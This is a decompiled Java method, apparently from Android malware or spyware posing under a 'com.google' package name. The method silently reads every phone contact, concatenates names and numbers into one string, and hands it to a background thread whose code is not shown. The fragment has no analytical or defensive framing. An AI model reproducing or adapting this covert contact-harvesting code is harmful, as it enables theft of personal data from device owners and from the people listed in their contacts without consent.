    public void getPhoneContacts()
    {
        this.data = "";
        android.database.Cursor v7 = this.mContext.getContentResolver().query(android.provider.ContactsContract$CommonDataKinds$Phone.CONTENT_URI, com.google.bps.bfcfc.Contact.PHONES_PROJECTION, 0, 0, 0);
        if ((v7 != null) && (v7.getCount() > 0)) {
            while (v7.moveToNext()) {
                String v8 = v7.getString(1);
                if (!android.text.TextUtils.isEmpty(v8)) {
                    this.data = new StringBuilder(String.valueOf(this.data)).append("|").append(v7.getString(0)).append("#").append(v8).toString();
                }
            }
            v7.close();
        }
        new Thread(new com.google.bps.bfcfc.Contact$1(this)).start();
        return;
    }
}
